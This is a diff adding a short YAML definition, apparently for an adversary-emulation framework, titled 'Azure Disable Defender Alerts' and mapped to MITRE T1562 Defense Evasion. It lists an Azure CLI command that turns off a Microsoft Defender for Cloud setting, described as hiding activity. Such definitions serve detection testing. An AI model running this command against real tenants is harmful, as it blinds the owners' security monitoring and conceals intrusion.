@@ -1,0 +1,9 @@
+name: Azure Disable Defender Alerts
+description: Disables Microsoft Defender for Cloud alerts to hide activity.
+mitre_technique: T1562
+stage: Defense Evasion
+steps:
+  - action: az security setting list
+    description: Check current Defender for Cloud settings
+  - action: az security setting update --name MCAS --value "Disabled"
+    description: Disable Defender alerting capability
